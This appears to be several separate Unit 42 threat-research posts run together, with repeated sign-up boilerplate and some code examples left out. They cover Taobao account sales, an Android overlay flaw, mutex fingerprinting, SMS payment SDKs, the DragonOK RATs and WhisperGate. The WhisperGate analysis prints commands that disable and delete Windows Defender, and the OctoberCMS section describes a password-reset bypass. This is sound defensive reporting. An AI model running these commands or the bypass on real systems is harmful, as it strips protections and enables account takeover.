"In order to sell anything on Taobao, a seller must at least create a valid Alipay account (similar to PayPal) linked to a valid Chinese citizen ID number (similar to a U.S. Social Security number), and then associate it with a valid Chinese bank account under the same citizen ID."
"However, identity theft is a global concern and the Chinese citizen ID is no exception, allowing for potential sellers to simply purchase a usable identity online."
"Based on our investigation, we believe that stolen accounts for these universities are actively selling on Taobao."
"On August 27, we reported our findings to Taobao."
"Their response was that they were addressing this issue and have already removed a number of these items, with the remainder requiring further investigation."
"However, this malicious seller activity may also reveal a larger scale problem within university systems."
"Through the types of accounts advertised on Taobao, an attacker can steal a student or staff account, assume their identity, and gain unauthorized access to standard university resources."
"More sophisticated and nefarious uses include leveraging accounts in social engineering/phishing attacks or exploiting access to high-value university systems (e.g., personnel, financial, research) to steal information."
"Fortunately, a number of the institutions impacted by this activity have already implemented two-factor authentication for high-value resources, reducing the risk of the latter."
"Yet, we believe the residual risk and exposure call for further action."
"The following are our suggestions for discovering and mitigating risks associated with this activity: Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) Today, Palo Alto Networks Unit 42 researchers are announcing details on a new high- severity vulnerability affecting the Google Android platform."
Patches for this vulnerability are available as part of the September 2017 Android Security Bulletin.
"This new vulnerability does NOT affect Android 8.0 Oreo, the latest version; but it does affect all prior versions of Android."
"There is some malware that exploits some vectors outlined in this article, but Palo Alto Networks Unit 42 is not aware of any active attacks against this particular vulnerability at this time."
"Since Android 8.0 is a relatively recent release, this means that nearly all Android users should take action today and apply updates that are available to address this vulnerability."
"What our researchers have found is a vulnerability that can be used to more easily enable an “overlay attack,” a type of attack that is already known on the Android platform."
This type of attack is most likely to be used to get malicious software on the user’s Android device.
This type of attack can also be used to give malicious software total control over the device.
"In a worst-case attack scenario, this vulnerability could be used to render the phone unusable (i.e., a “brick”) or to install any kind of malware including (but not limited to) ransomware or information stealers."
"In simplest terms, this vulnerability could be used to take control of devices, lock devices and steal information after it is attacked."
An “overlay attack” is an attack where an attacker’s app draws a window over (or “overlays”) other windows and apps running on the device.
"When done successfully, this can enable an attacker to convince the user he or she is clicking one window when, in fact, he or she is actually clicking another window."
"In Figure 1, you can see an example where an attacker is making it appear that the user is clicking to install a patch when in fact the user is clicking to grant the Porn Droid malware full administrator permissions on the device."
Figure 1: Bogus patch installer overlying malware requesting administrative permissions
You can see how this attack can be used convince users to unwittingly install malware on the device.
This can also be used to grant the malware full administrative privileges on the device.
An overlay attack can also be used to create a denial-of-service condition on the device by raising windows on the device that don’t go away.
This is precisely the type of approach attackers use with ransomware attacks on mobile devices.
"Of course, an overlay attack can be used to accomplish all three of these in a single attack: Overlay attacks aren’t new; they’ve been discussed before."
"But until now, based on the latest research in the IEEE Security & Privacy paper, everyone has believed that malicious apps attempting to carry out overlay attacks must overcome two significant hurdles to be successful: These are significant mitigating factors and so overlay attacks haven’t been reckoned a serious threat."
"However, our new Unit 42 research shows that there is a way to carry out overlay attacks where these mitigating factors don’t apply."
"If a malicious app were to utilize this new vulnerability, our researchers have found it could carry out an overlay attack simply by being installed on the device."
"In particular, this means that malicious apps from websites and app stores other than Google Play can carry out overlay attacks."
It’s important to note that apps from websites and app stores other than Google Play form a significant source of Android malware worldwide.
The particular vulnerability in question affects an Android feature known as “Toast.” “Toast” is a type of notification window that “pops” (like toast) on the screen.
“Toast” is typically used to display messages and notifications over other apps.
"Unlike other window types in Android, Toast doesn’t require the same permissions, and so the mitigating factors that applied to previous overlay attacks don’t apply here."
"Additionally, our researchers have outlined how it’s possible to create a Toast window that overlays the entire screen, so it’s possible to use Toast to create the functional equivalent of regular app windows."
"In light of this latest research, the risk of overlay attacks takes on a greater significance."
"Fortunately, the latest version of Android is immune from these attacks “out of the box.”"
"However, most people who run Android run versions that are vulnerable."
This means that it’s critical for all Android users on versions before 8.0 to get updates for their devices.
You can get information on patch and update availability from your mobile carrier or handset maker.
"Of course, one of the best protections against malicious apps is to get your Android apps only from Google Play, as the Android Security Team aggressively screens against malicious apps and keeps them out of the store in the first place."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Mutex analysis is an often overlooked and useful tool for malware author fingerprinting, family classification, and even discovery."
"Far from the hypothesized ""huge amount of variability"" in mutex names, likely hypothesized due to the seemingly random appearance of them, practical mutex usage is embarrassingly consistent."
"In fact, over 15% of all collected worms share a single mutex [2gvwnqjz]."
"This blog was sourced from the data generated by the WildFire Analytics cloud, which processes thousands of samples a day and provides insights into various characteristics and behaviors of malware worldwide."
"But before we get into the details, here is a quick overview of mutexes and why they exist in the first place."
The mutex is the fundamental tool for managing shared resources between multiple threads (or processes).
"If you think of the threads as a whole bunch of people in a meeting, all trying to talk at once, a mutex is the baton that gets passed from one person to the next so that there’s only one person talking at a time."
The important thing to understand is what the mutex is really protecting.
"In the above example, the resource being protected isn’t the right to speak, as many might think, but rather the ability to listen."
Here’s a more technical example.
"Lets say you want to update an Internet Explorer (IE) cookie file, adding a unique identifier for use later."
"Naively, what you need to do is read the cookie file in, add your data to what you’ve read, and write the file back to disk."
But what if IE is running and also updating that file?
"The worst case, for you, is that both you and IE read the file at the same time but you write your edits first."
This is because IE will completely destroy your edits when it writes its new version of the file over yours.
The solution to this problem is to use a mutex to protect the integrity of the cookie file.
A process that has the mutex knows that while it holds that mutex no other process will be accessing the cookie file.
"It can then read, tweak, and write the file without fear of any clobbering by other processes."
"Since each shared resource can only have a single mutex effectively protecting it, leveraging that mutex is indication that a program will be using said resource."
"In the cookie file example above, just referencing the mutex protecting that file indicates, with extremely high probability, that functionality to change the file exists somewhere in the program."
"Any given mutex, and protected functionality, can then be thought of as an independent library of sorts."
"Note that while the technical implementation may not expose said functionality as a normal library, such exposure is not necessary for the types of analysis performed here."
That library’s usage can be analyzed in terms of who uses it.
Simply put: malware writers leverage malware specific libraries and groups of like actors will reuse these core libraries when able. The needle in a haystack problem forever plagues malware research: it’s extremely difficult to find reliable information with malware writers constantly working to undermine or eliminate that information.
"But, in the case of mutex analysis, the useful information pretty well slapped us in the face."
"As can be clearly seen, mutex 2gvwnqjz1 is strongly associated with malware."
"In fact, we have only seen it in malware."
"As is equally obvious, not all mutexes offer such dramatic insight."
There are many common mutexes shared across both benign software and malware.
"What’s more, they don’t all share millions of uses across both sides of the fence."
"In cases such as these the common approach is to use sets of the data, in this case sets of mutexes, to create fingerprints of each sample and then leverage those fingerprints to extract higher confidence classification decisions."
"While this avenue of research is being pursued, it suffers from all the traditional challenges of big data research."
"In other words, it’s slow going."
"In parallel, and to inform better hypothesis for the fingerprint generation, research is being done to determine how far single mutex analysis can take us."
The research is ongoing but the initial results are extremely promising.
"The number of times any single mutex is used drops rapidly from the millions of samples down to thousands and from there, even further."
Tens of thousands of the mutexes have been seen in only a single sample each.
This results in a few hundred thousand individual mutexes available for further analysis.
What quickly becomes apparent is that a large majority of the mutexes provide no obvious means to automatically classify them as necessarily indicative of good or bad behavior.
"And, unfortunately, the ones, which are reasonably easy for a human to identify, are so for significantly different reasons."
"For example, “autoproto_*” -- More than 20 mutexes share that preface, offering a natural fingerprint."
“global\setup_028746_mutexitem” -- Associated solely with known malware digital signers.
“defined_setnocandy” -- After reading mutex names for a few hours this just sticks out like a sore thumb.
Only the first of the examples had the mutex associated with a vast majority of malware samples.
This implies that any fully automated association of a mutex to either benign or malware samples will itself require complex fingerprinting and confidence models.
Full automation is always the ideal but it isn’t always necessary.
With the appropriate tools it’s possible to enable a single researcher to continually review and categorize new mutexes.
"The initial classifications to be used are “benign”, “malware”, or “statistical”."
"Meaning that the mutex either itself indicates a benign or malware sample, or that the mutex alone is not enough to make a determination and the statistical ratio of benign to malware is the best it can offer."
The backlog of already collected mutexes is too great for a small team of researchers to meaningfully tackle without some kind of ranking system.
"Luckily, the most objective piece of data collected about each mutex, how many samples were classified benign vs. malware, has all the information necessary to ensure that the researchers’ tackle the low hanging fruit first."
"With over hundreds of thousands of malware associations, this specific mutex is associated exclusively with the Net-worm:W32/Allaple malware family which has been around since 2006 but continues to propagate and reinvent itself through the years."
Though the fact that the malware writer obviously named the mutex by rolling their face on the keyboard made it obvious before we'd done any further analysis that we’d found a unique identifier within the binaries.
This malware is well documented as a powerful polymorphic worm that encrypts itself differently every time it propagates.
"The evasive nature of this malware family leads to a different file hash, import hash, and only a 20% average SSDeep hash overlap between the samples."
"But because the mutex name is set at compile time, the mutex itself offers a common thread between all of the samples we collected and analyzed."
"However, this particular mutex was associated with only a recent subset of the Allaple family."
"Unlike many other avenues of research and classification, mutex name based associations provides an almost trivial means of uniquely identifying common code blocks and thereby malware families."
The first thing our researchers noticed was the similarity between this mutex name and the previous one.
"While programmatic analysis would have a hard time associating the two, it's obvious to a human that the same face rolling technique was used to name this mutex."
The author simply rolled around a bit more.
Quick follow up analysis revealed that this mutex was also associated with the Allaple malware family.
"More interestingly, it was another, non-overlapping, subset of the Allaple family."
Several hypotheses followed directly from this observation.
Absolute proof for a few of these hypotheses may never be realized.
"However, and lucky for us, the malware author was arrested in 2010 so several of the hypothesis can be verified."
The first is very likely due to the similarities present in the order of keys hit.
Both begin with “jhd”.
"“jh” itself is more common than would be expected given that, with fingers on the home row, it requires the right index finger to move and press another key before any other key is struck."
And “jh” is always followed by a key from the left side of the keyboard.
These unique consistencies make it extremely improbable that two different people named these mutexes.
The second mutex appears to be a concerted effort to make the mutex seem “more random” than the first.
It's immediately obvious that the author didn't move his fingers/hands much while typing the first.
It’s obvious enough that the author likely noticed it when reworking this section of code.
It's highly improbable that one would see the second mutex and make a concerted effort to make it appear “less random”.
"And, as can be quickly verified by searching through standard virus detection logs, the mutexes did in fact appear in the hypothesized order."
The third is likely due to the lack of overlap between mutex names.
"However, the research necessary to conclusively prove this hypothesis would be very time consuming and provide little other benefit."
The fourth is likely due to the mutexes only appearing in a single malware family.
"If this functionality were available in some more open source setting, and was of even moderate quality, we would expect to see it used in other malware families as well."
"As this functionality has not migrated outside the Allaple family, either the quality of the code is bad (see: face rolling), or it's simply not available to other malware developers. The fifth is very likely as a change to the specific functionality these mutexes protect, with every change to any functionality, is simply not a practical method of development."
"And indeed, as with the second hypothesis, standard virus detection logs prove that each of these mutexes do span multiple variants of the worm."
Mutex names provide a window into the entire development process and timeline for malware.
"Idiosyncrasies of the malware author become apparent, the evolution can be traced, the availability or quality of code deduced, and reuse of functionality made clear with a simple mutex."
No other currently used method of analysis offers such a personal view into malware development.
Mutex name analysis as a whole offers a unique look into the results of any sample classification system and the malware therein.
"While the research may never result in a fully automated decision system, it has been proven that researchers employing a hybrid approach to analysis will be able to provide critical and timely information to support the continual improvement of the classification system as a whole."
"From edge case to systematic misclassifications, mutex usage is even more generally the canary in a coal mine than was previously realized. While tedious and time consuming, combing through mutex names did come with more than a few good laughs."
"After nearly as much debate as some of the real research, we’ve whittled the list down to our favorites (For the curious, these are all malware mutexes)."
Enjoy.
Pluguin - When penguins and wall sockets mate.
"Development environments don’t have spell check but, maybe they should."
senna spy rock in rio 2001 virus - Subtlety.
Overwhelming.
"There were many variations on this one, Senna’s obviously proud of his work."
chinese-hacker-2 - We’re not sure which is worse: that this is a legitimate signature or a sad frame job.
"Either way, somebody needs their computer privileges revoked."
mutexpolesskayaglush*.*svchost.comexefile\shell\open\command %1 %*@ - Putting shell code in a mutex name is right on the border of brilliant and insane.
We’ll leave that determination to the reader.
"mr_coolface - Really, not so much, no."
don't stop me!
i need some money!
- http://www.monster.com/ - don’t say we never did anything for you.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
In-App Purchase (IAP) has become a popular way to sell services and virtual items through mobile applications.
"In the Android ecosystem, in addition to the official IAP service by Google, there are many third-party IAP Software Development Kits (SDKs) spread around the world."
Some of these third-party SDKs provide IAP services based on existing online payment platforms.
"However, an increasingly popular method uses premium SMS."
"A primary reason for the popularity of SMS-based IAP is that it does not require Internet connectivity, just cell service."
"While this is more convenient for both users and developers, there are significant security concerns with using SMS-based IAP on Android."
These concerns are detailed below.
Installing an Android app with SMS-based IAP is almost equivalent to installing an “SMS manager” (or even a “contacts manager”) app on the phone.
"The reason is because most SMS-based IAP SDKs include comprehensive functionalities to monitor, manage, and even intercept a user’s SMS communication silently in the background, without any user interaction or knowledge."
"This is a critical point: these SMS-based IAPs are able to independently send, receive, or block any SMS to/from any cellphone on which they are installed, without the user having any idea this is occurring."
This can include receiving instructions from a cloud server under the control of the SDK author.
"Palo Alto Networks Wildfire, through custom SMS blocking policies, recently discovered eight different SMS-based IAP SDKs with this abusive functionality."
"Further investigation shows that these SDKs have been used in at least 25 different Android games in two third-party app markets, JoloPlay and Wanyx."
17 of the top 50 games in JoloPlay contain at least one of these IAP SDKs.
"According to JoloPlay’s website, these 17 games have been downloaded and installed more than 1.7 million times."
"Most of them are pirated or repackaged from famous Android games, such as Plants vs. Zombies 2, Jewels Maze, Fishing Joy, and Where's My Water."
"According to Wanyx’s website, 12 of the 50 games in Wanyx’s suggested games column contain the discussed IAP SDKs."
"In Wildfire, we classify apps using these IAP SDKs as Potentially Unwanted Applications (PUA)."
"The reason they are not marked as malware is because all SDKs require user interaction when making a purchase (e.g. user clicks on the agreement). However, these IAP SDKs are very dangerous to users because of what they are doing with a user’s SMS without his or her knowledge."
Below are the details of eight SMS-based IAP SDKs discovered by Wildfire:
All of the identified IAP SDKs use premium SMS to provide the IAP service.
They implement code that will send SMS to pre-defined premium numbers (Figure 1).
This code implementation is also abstracted in an interface for developers.
"However, in addition to sending, all of these IAP SDKs also implement a BroadcastReceiver and register it for SMS_RECEIVED actions (Figure 2). In addition, Umpay, WiPay, and NgstreamPay will also register a ContentObserver to monitor all changes in an SMS inbox (Figure 3)."
"After an SMS is received, these receivers and observers will check the originating number and/or message body, and block the SMS by some policies (Figure 3 and Figure 4)."
"For example, in Figure 4, the policy is defined as deleting SMS satisfying two conditions at the same time: 1. Message comes from the phone number “+8610658008” or “10658008” 2."
The message body contains the term “You will use” (translated from Chinese shown in Figure 4).
"Some of these policies are hard-coded in the SDKs, e.g., in UmPay; but others are pre-fetched from cloud servers that are operated by the SDKs’ providers (Figure 5)."
"Again, all the functions mentioned above run silently in the background."
"Except for LinkSMSPayment, all the IAP SDKs listed in this post do not notify the user in any way that they are taking actions against the user’s daily SMS communication."
Users have no idea if an SMS was blocked or if it was delivered.
All of the IAP SDKs in this post target Chinese users.
Both SMS sending and SMS blocking will only affect Android phones with a valid Chinese mobile phone number.
Some of them will even check which SIM operator a user is using (Figure 6).
An interesting observation is that half of these IAP SDKs implement the send and block SMS functions in separate codes.
"More specifically, the code was separated into two parts."
One piece is embedded into Android apps or games for developers as a part of the source code.
"The other piece is included separately in the assets directory in APK files, and will be invoked by Java reflection in runtime (Figure 7)."
"For example, JoloPay, WiPay, TPADPay and EgamePay follow this design exactly."
AstepPay implements both sending and blocking in the “assets/astep.bin” file.
This separation of functions may be intended to avoid detection by security products.
SMS should not be used in payment or authentication for e-finance transactions.
"On the existing Android platforms it is very easy for any installed apps to send, intercept, or even forward SMS messages in background without any user knowledge or interaction."
"Previous attack cases, such as Zitmo and Cardbuyer, showed the risk of using SMS for payment authentication."
"For instance: To improve the security of IAP, some payment platforms try to add a verification step in order to confirm an SMS was really sent by the user, for example, it will ask the user to reply with certain text that was sent to a phone number specified by the user."
"However, two months ago, WildFire discovered a new Android malware, Cardbuyer, that circumvents this verification technique."
"Cardbuyer targets 11 different online payment platforms, as well as stolen prepaid cards, by parsing their verification SMS and automatically replying."
"The good news is this technique might be partially mitigated in Android KitKat (version 4.4), where Google introduced a security enhancement around SMS security."
A user can set a system-wide default SMS app as the only app with permission to send and receive SMS.
"However, other installed apps are still allowed to receive SMS and upload the content via Internet."
"But as of June 4, 2014, only 13.6% of worldwide users had installed Android 4.4 or above."
This means more than 86% of Android users do not benefit from this enhancement and are vulnerable.
"However, Palo Alto Networks users are protected from these PUAs by subscribing to WildFire and GlobalProtect services."
SMS-based IAP SDKs have become a gray zone that needs close attention.
"Because of convenience and popularity, SMS-based IAP will likely continue to spread and increase in worldwide use."
"However, users need to be protected from PUAs and malware that abuses the SMS-based IAP."
"Also, developers need to be aware that SMS cannot meet security requirements (e.g. authentication) during the payment transactions."
We would like to thank Kyle Sanders for his contribution to this work.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) Palo Alto Networks Unit 42
used the AutoFocus threat intelligence service to identify a series of phishing attacks against Japanese organizations.
"Using AutoFocus to quickly search and correlate artifacts across the collective set of WildFire and other Palo Alto Networks threat intelligence, we were able to associate the attacks with the group publicly known as “DragonOK.”"
[1] These attacks took place between January and March of 2015.
"DragonOK has previously targeted Japanese high-tech and manufacturing firms, but we’ve identified a new backdoor malware, named “FormerFirstRAT,” deployed by these attackers."
See the “Malware Details” section for analysis of the three RATs and two additional backdoors deployed in this persistent attack campaign.
"This campaign involved five separate phishing attacks, each carrying a different variant of Sysget malware, also known as HelloBridge."
The malware was included as an attachment intended to trick the user into opening the malware.
This included altering the icon of the executable to appear as other file types (Figure 1) as well as decoy documents to trick users into thinking they had opened a legitimate file.
Figure 1. Icons used by malicious Sysget attachments.
"All of the Sysget files used in this campaign communicate with a single command and control (C2) server, hosted at biosnews[.]info."
Sysget communicates with this server using the HTTP protocol; see the Malware Details section for specifics of the command and control traffic.
"All five phishing campaigns targeted a Japanese manufacturing firm over the course of two months, but the final campaign also targeted a separate Japanese high-tech organization."
(Figure 2)
Figure 2.
Five Sysget samples used to target two Japanese organizations.
Four of the five Sysget variants included a form of decoy document to trick users into believing they had opened a legitimate file rather than malware.
Two of the executables used decoy documents that included information about obituaries.
"Figure 3 shows a GIF file containing an obituary notice for a woman, while Figure 4 shows a Microsoft Word document containing the obituary of a man."
Figure 3. Japanese decoy document containing an obituary notice for a woman.
Figure 4. Japanese decoy document containing an obituary notice for a woman.
"The Sysget sample with a PDF icon created a second executable, named Adobe.exe, which simply displayed the following warning."
Figure 5. Error message generated by Adobe.exe
The final Sysget sample used a Microsoft Excel icon and opened an Excel document that contained cells filled with “XXXXXX.”
(Figure 6) Figure 6.
Excel spreadsheet with Xs in multiple rows and columns.
These Sysget variants appear to be a first stage payload in these attacks.
"During analysis of this threat, we identified five additional backdoor tools hosted on biosnews[.]info which may be downloaded by the Sysget variants once the attackers have established a foothold."
"Three of the backdoors, NFlog, PoisonIvy, and NewCT have previously been publicly associated with DragonOK."
"Additionally, the actors have now added the popular PlugX backdoor to their toolkit."
"An additional backdoor appears to be a new, custom-built tool, which we have not previously associated with DragonOK or any other attack group."
We’ve named this tool “FormerFirstRAT” as it appears to be the names used by the developers to refer to their creations.
Figure 7 shows the relationship between these backdoors and their respective command and control servers.
Figure 7. Relationship between five additional backdoors used by DragonOK and their C2 servers in this campaign.
The following section details the functionality of the malware deployed in this campaign.
Sysget/HelloBridge
"In this campaign, Sysget samples were attached to e-mails and used various icons to trick users into infecting their systems."
"The majority of these samples are self-extracting executables that contain both a malicious downloader, along with a legitimate file."
"When the self-extracting executable is launched, the downloader and legitimate file are typically dropped in one of the following directories and then executed: When the malicious downloader is executed, it begins by creating the 'mcsong[]' event in order to ensure one instance is running."
It then spawns a new instance of 'C:\\windows\\system32\\cmd.exe' with a window name of 'Chrome-Update'.
It attempts to obtain a handle to this window using the FindWindowW API call and then proceeds to send the following command to this executable.
This allows the malware to indirectly execute a command within the cmd.exe process.
This registry key will ensure an executable that it later downloads is configured to persist across reboots.
"It then sends the 'exit' command to this executable, which will kill this particular process."
The malware then attempts to read the following file.
This file is used to store a key that is later used to decrypt data received during network communications.
"If the file does not exist, it will make the following GET request: The filename and name parameters are statically set in the above request."
The server responds with data similar to the following: The first two pieces of data ('17' and 'gh204503254') are then written to the ibmCon6.tmp file referenced earlier.
The malware will copy itself to the %TEMP% directory with the executable name of 'notilv.exe'.
"Due to the previously written registry key, this file will execute when the machine is restarted and the current user logs in."
The malware then makes the following request: The filename and uid parameters are statically set in the above request.
The response data is decrypted using the RC4 cryptographic stream cipher.
The 'gh204503254' data that was previously downloaded is used as the key.
"The following Python code can be used for decryption, using the 'gh204503254' key: At this stage, the remote server can send a number of different responses."
"The following example response will instruct the malware to download a remote executable file: 'filename.exe' is the path where the downloaded file will be stored, and '01234567890123456789012345678901' is the value supplied in the subsequent HTTP request."
"When this command is received, the following example request is made:"
"At this point, the remote server will respond with an unencrypted file that the malware saves to the system."
The remote server can also send the following example response.
This response will instruct the malware to upload the specified file:
An example upload request can be seen below: The remote server can also send the following example response.
This response will instruct the malware to execute the given command: The results of this -execution are stored in a temporary text file in the %TEMP% directory.
These results are encrypted using the same technique mentioned previously.
An example upload of these results can be seen below: PlugX PlugX is a backdoor that is often used by actors in targeted attacks.
This version of PlugX attempts to disguise itself as a Symantec product.
The following icon is present in this sample: Figure 8.
PlugX file uses Symantec logo icon.
"Upon execution, the malware will install itself as a service with the following parameters: It may also set the following registry key for persistence:"
PlugX is a well-studied malware family with a long history of use in targeted attacks.
More information on its history is available at the following links.
FormerFirstRAT This remote administration tool (RAT) is referred to as “FormerFirstRAT” by its authors.
FormerFirstRAT communicates using unencrypted HTTP over port 443; the use of mismatching ports and communication protocols is not uncommon in targeted attack campaigns.
"In addition, port / protocol mis-match traffic can be an indicator of bad activity."
"When the malware starts, it writes the following registry key to ensure persistence: The malware then proceeds to send an HTTP POST request with information about the victim system."
The following information is collected:
The following settings are used for command and control: The malware encrypts network communication using the AES128 encryption cipher.
It uses the MD5 of 'tucwatkins' in order to generate the key.
All data is sent via HTTP POST requests.
"While not a distinct TTP, the author of this malware may be a soap-opera fan."
The following code demonstrates how you can decrypt the malware communications using Python: The malware then enters a loop where it will send out periodic requests to the remote server.
The remote server has the ability to respond and provide instructions to the RAT.
We have identified the following functionalities:
"An example HTTP POST request can be seen below. NFlog When loaded inside of a running process, NFlog begins by spawning a new thread."
This new thread is responsible for all malicious activities produced by this DLL.
"Initially, the malware will set the following registry key: Where [current_executable_filename] is the path to the current running executable, which is acquired via a call to GetModuleFileNameA."
This registry key ensures that the malware will persist across reboots when the current user logs in.
Multiple string obfuscation routines are included in this malware sample.
Strings contained in the binary are decrypted via a simple binary XOR against a single byte key of 0x25.
The malware proceeds to create a named event object of 'GoogleZCM' and uses this event in order to ensure only one instance of this malware is running at a given time.
The malware proceeds to make an attempt at binding to the local host on port 1139.
The malware attempts to ensure Internet connectivity by making a request to www.microsoft.com.
An example request is shown below.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) Beginning on Jan. 14, 2022, reports began emerging about a series of attacks targeting numerous Ukrainian government websites."
"As a result of these attacks, numerous government websites were found to be either defaced or inaccessible."
"A day later, public reporting outlined new malware called WhisperGate that originally was observed on Jan. 13, 2022."
"This malware disables Windows Defender Threat Protection, is destructive in nature and was discovered to have targeted multiple organizations in Ukraine."
Microsoft has publicly attributed the use of this custom malware to a threat actor they refer to as DEV-0586.
"Though both attacks have targeted Ukrainian organizations, the two threats have so far been implemented in separate situations."
"As a result of these events, Palo Alto Networks researchers took immediate action to ensure that customers anywhere in the world can be appropriately protected against these reported threats, however they may be exploited."
These attacks ultimately resulted in the investigation of the following two threats: Palo Alto Networks customers can use Xpanse or Threat Prevention for the Next-Generation Firewall to identify vulnerable and/or internet-facing instances of OctoberCMS.
"Protections against WhisperGate malware have been included in Cortex XDR, as well as in the WildFire and Advanced URL Filtering subscriptions for the Next-Generation Firewall."
There is a Cortex XSOAR pack available to assist with detecting and mitigating both threats.
CVE-2021-32648 Vulnerability WhisperGate Malware Family Mitigation Actions Hunting for WhisperGate Conclusion Additional Resources
The CVE-2021-32648 vulnerability lies within the OctoberCMS platform prior to version 1.0.472 and results in an attacker gaining access to any account via a specially crafted account password reset request.
This vulnerability is believed to have allowed threat actors to gain access to the underlying websites leveraged by the Ukraine government.
"Once the vulnerability was discovered, Palo Alto Networks threat researchers quickly began reverse-engineering the patch that remediated this vulnerability and were able to produce a working proof of concept (PoC) in a very short time."
"Later that day, a public PoC surfaced, allowing organizations to better understand this vulnerability and how it is exploited."
"Using our PoC, we created the following demonstration video of how a malicious actor would exploit the CVE-2021-32648 vulnerability, log into the compromised OctoberCMS account and to deface a web page hosted by the server:"
"To determine how this vulnerability was exploited, we analyzed the patch that developers added to OctoberCMS version 1.0.472 to mitigate the CVE-2021-32648 vulnerability."
We discovered that the vulnerable code existed in the Auth/Models/User.php file within the October Rain library of OctoberCMS.
"The code that exposes this vulnerability is within a function named checkResetPasswordCode, specifically, line 281 in User.php."
"The following line of code attempts to validate the inbound password reset request by comparing the reset code submitted within the HTTP request with the reset code generated by OctoberCMS during a legitimate reset process: To exploit this vulnerability, the actor would simply supply a boolean true value as the reset code within a custom-crafted HTTP request to reset the password of an account."
"By supplying the boolean true, the comparison between boolean true and the reset code string results in a boolean true, even though the two variables have different types."
"This effectively validates the actor’s inbound password reset request, which allows the actor to then change the password To fix this vulnerability in version 1.0.472, the OctoberCMS developer changed the line of code above to use === instead of == when comparing the values of the reset code provided by the user via an HTTP POST request."
"The difference between === and == involves the === comparing the value and type of value of the variable, not just the value, as happens when using ==."
"To demonstrate the difference, the following two commands run PHP code to show that a comparison of the string code with boolean true using == results in a boolean true, while the same comparison using === results in a boolean false: As a result of the analysis of the CVE-2021-32648 vulnerability, various product protections were created or enhanced."
More information about these protections can be found within the Mitigation Actions section of the briefing.
"First observed by Microsoft on Jan. 13, 2022, WhisperGate malware is computer network attack (CNA) malware aimed at deleting Microsoft Windows Defender and corrupting files on the target."
It consists of two samples: One appears as ransomware while the other is a beaconing implant used to deliver an in-memory Microsoft Intermediate Language (MSIL) payload.
"The in-memory code uses Living Off the Land Binaries (LOLBINs) to evade detection and also performs anti-analysis techniques, as it will fail to detonate when certain monitoring tools exist."
"At the time of writing, there are two known samples identified as WhisperGate: Stage1.exe and Stage2.exe."
"Stage1.exe purports to be ransomware, as it overwrites the target’s master boot record with 512 bytes and upon reboot displays the following ransom note: Stage2.exe is a beaconing implant that performs an HTTPS connection to download a JPG file hosted on Discord’s content delivery network (CDN)."
Discord’s CDN is a user-created service that allows users to host attachments and is not malicious.
The hosted file is retrieved from the following URL: hxxps://cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg
File Tbopbh.jpg is the malicious payload that is in-memory loaded and kicks off the destructive capabilities.
"The following patterns of activities are associated with this payload: 1. File InstallUtil.exe is copied to the host’s %TEMP% directory, e.g. C:\Users\[USERNAME]\AppData\Local\Temp."
This file is a legitimate Microsoft Windows binary.
"Two instances of PowerShell are spawned with an encoded command to sleep for 10 seconds, e.g. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA== 3."
A Visual Basic Script (VBS) is created in C:\Users\[USERNAME]\AppData\Local\Temp named: Nmddfrqqrbyjeygggda.vbs 4. Process wscript.exe is used to execute the VBS script in step 3.
"The VBS script is used to call PowerShell to set Windows Defender exclusion path to C:\ e.g. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Set-MpPreference -ExclusionPath 'C:\' 5. AdvancedRun.exe is created and written to the C:\Users\[USERNAME]\AppData\Local\Temp directory. 6."
AdvancedRun.exe is used to execute PowerShell.exe to delete and stop Windows Defender.
"The following command parameters are passed to AdvancedRun: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""rmdir 'C:\ProgramData\Microsoft\Windows Defender' -Recurse"" /StartDirectory """" /RunAs 8 /Run ""C:\Users\USERNAME]AppData\Local\Temp\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run 7."
"PowerShell process used to delete Windows Defender, e.g. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rmdir 'C:\ProgramData\Microsoft\Windows Defender' -Recurse 8. File InstallUtil.exe running from C:\Users\[USERNAME]\AppData\Local\Temp directory."
"The in-memory payload (Tbopbh.jpg) is running within the context of the InstallUtil.exe process 9. Multiple instances of cmd.exe calling Ping.exe to delete file InstallUtil.exe, e.g. cmd.exe /min /C ping 111.111.111[.]111 -n 5 -w 10 > Nul & Del /f /q %TEMP%\InstallUtil.exe 10. File AdvancedRun.exe is deleted from the C:\Users\[USERNAME]\AppData\Local\Temp directory by the stage2.exe binary. 11. ICMP traffic to host: 111.111.111[.]111 12."
"All files and directories, including those on mounted USB drives, excluding the floppy drive (A:) are targeted."
The following file extensions are overwritten with a one-byte value of 0xCC.
13. Targeted files greater than one megabyte are truncated to one megabyte when overwritten.
14. Virus & Threat protection is no longer available from Windows Security.
Organizations running OctoberCMS prior to Build 472 and v1.1.5 are encouraged to update to the latest version.
"Additionally, in order for this vulnerability to be exploited, the web server must be running PHP below 7.4."
"Palo Alto Networks customers receive protections against the OctoberCMS vulnerability in the following ways: Palo Alto Networks customers receive protections against WhisperGate malware in the following ways: The Cortex XSOAR ""WhisperGate & CVE-2021-32648'' pack can help automatically detect and mitigate the two threats."
Read more on the XSOAR marketplace.
